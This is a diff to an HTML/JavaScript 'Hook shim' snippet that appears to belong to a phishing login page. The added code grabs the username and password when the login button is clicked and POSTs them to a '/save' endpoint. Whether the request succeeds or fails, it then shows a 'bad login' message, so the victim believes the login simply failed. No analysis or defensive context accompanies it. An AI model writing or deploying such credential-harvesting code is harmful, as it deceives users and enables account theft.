@@ -1,27 +1,30 @@
 <!-- START: Hook shim -->
-<script src="https://code.jquery.com/jquery-3.2.1.min.js" 
-integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>
+<script src="https://code.jquery.com/jquery-3.2.1.min.js"
+integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4="
+crossorigin="anonymous">
+</script>
 
 <script type="text/javascript">
- function loadHook()
- {
-     var userName = document.getElementById(Login.userNameInput).value;
-     var password = document.getElementById(Login.passwordInput).value;
-     console.log(userName);
-     console.log(password);
+//<![CDATA[
+$('#BadLogin').hide();
+$('#LoginButton' ).click(function( event ) {
+  event.preventDefault();
+
      $.ajax({
          url: '/save',
-         data: $('#loginForm').serialize(),
+         data: [$('#UserName').serialize(),$('#Password').serialize()].join('&'),
          contentType: "application/x-www-form-urlencoded",
          type: 'POST',
          success: function(response) {
-             console.log(response);
+             $('#BadLogin').show();
+             $('#BadLogin').css("visibility", "visible");
          },
          error: function(error) {
-             console.log(error);
+             $('#BadLogin').show();
+             $('#BadLogin').css("visibility", "visible");
          }
      });
-     return false
- }
-</script>
-<!-- END: Hook shim -->
+     return true;
+ });
+//]]>
+</script> <!-- END: Hook shim -->
